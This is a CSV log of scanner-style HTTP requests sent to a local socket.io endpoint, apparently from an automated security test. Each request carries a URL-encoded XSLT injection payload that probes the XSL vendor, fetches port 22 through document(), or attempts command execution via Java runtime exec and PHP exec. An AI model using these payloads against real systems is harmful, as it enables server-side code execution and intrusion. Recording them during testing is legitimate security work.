Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
80993,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,378,92,17
80996,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,315,153,34
80997,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,318,92,17
81000,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,305,153,34
81001,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,297,92,17
81004,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,249,153,34
81005,Tue Jun 02 01:36:06 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,255,92,17
81008,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3C&transport=polling&t=N9n_iER,200,OK,91,229,103
81009,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,288,92,17
81012,Tue Jun 02 01:36:07 WEST 2020,Tue Jun 02 01:36:07 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,221,92,17
